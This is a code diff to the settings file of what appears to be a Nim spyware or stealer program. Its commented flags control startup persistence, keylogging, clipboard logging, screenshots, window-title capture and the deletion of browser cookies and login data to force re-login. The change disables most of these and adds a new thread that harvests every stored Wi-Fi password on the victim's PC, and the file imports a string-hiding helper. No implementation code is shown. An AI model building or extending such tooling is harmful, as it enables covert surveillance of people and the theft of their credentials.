@@ -9,25 +9,30 @@ from functions/hideString import e
 ## persistenceThread is used for installing the program
 ## and starting it when the pc opens
 ## DEFAULT: true
-const USE_PERSISTENCE_THREAD*: bool = true
+const USE_PERSISTENCE_THREAD*: bool = false
 
 ## clipboardThread is used for logging the clipboard
 ## every time it changes
 ## DEFAULT: true
-const USE_CLIPBOARD_THREAD*: bool = true
+const USE_CLIPBOARD_THREAD*: bool = false
+
+## wifiPasswordsThread is used for getting
+## all the wifi passwords stored on user's pc
+## DEFAULT: true
+const USE_WIFI_PASSWORDS_THREAD*: bool = true
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
 ## DEFAULT: true
-const USE_WINDOW_NAME_THREAD*: bool = true
+const USE_WINDOW_NAME_THREAD*: bool = false
 
 ## screenshotThread is used for saving screenshots
 ## DEFAULT: true
-const USE_SCREENSHOT_THREAD*: bool = true
+const USE_SCREENSHOT_THREAD*: bool = false
 
 ## keyloggerThread is used for logging key presses
 ## DEFAULT: true
-const USE_KEYLOGGER_THREAD*: bool = true
+const USE_KEYLOGGER_THREAD*: bool = false
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
